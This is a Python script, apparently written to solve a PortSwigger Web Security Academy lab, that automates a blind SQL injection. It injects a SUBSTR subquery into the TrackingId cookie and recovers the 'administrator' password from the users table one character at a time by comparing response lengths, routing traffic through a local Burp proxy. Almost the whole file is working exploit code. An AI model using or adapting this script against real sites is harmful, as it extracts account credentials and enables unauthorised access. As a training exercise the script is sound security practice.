import requests

session = requests.session()

burp0_url = "https://aca41f9f1f231eafc02b47be005300d6.web-security-academy.net:443/filter?category=Accessories"
burp0_cookies = {"TrackingId": "aAUuVfs9QqD31eN7", "session": "sQkmz5BIGzUv6B8RE05cl5chB6cS25aj"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://aca41f9f1f231eafc02b47be005300d6.web-security-academy.net/filter?category=Tech+gifts", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)


# ######################  until here burp paste of request for python  ########################## #

# lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

url = burp0_url
cookies = burp0_cookies
headers = burp0_headers
char_list = "abcdefghijklmnopqrstuvwxyz1234567890"

def send_request_for_char():
    trackingId = burp0_cookies["TrackingId"]
    loaded_cookies = burp0_cookies
    response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response.status_code, len(response.content))
    click = len(response.content)
    print(f"click is {click}")
    password = ""
    pass_index = 1
    ting = False

    while not ting:
        for i in char_list:
            # print(i)
            loaded_cookies["TrackingId"] = trackingId +f"'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"
            print(loaded_cookies["TrackingId"])
            response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            print(response.status_code, len(response.content))
            if len(response.content) == click:
                password += i
                print(f"password is {password}")
                pass_index += 1
                break
            if i == char_list[-1] and password != "":
                ting = True
                print("TING! password is ready")
                print(f"password for username 'administrator' is:\n{password}\nuse it wisely")
            if i == char_list[-1] and password =="":
                print(f"sorry but no TING check ingridiants:{char_list}")
                break

if __name__ == '__main__':
    send_request_for_char()

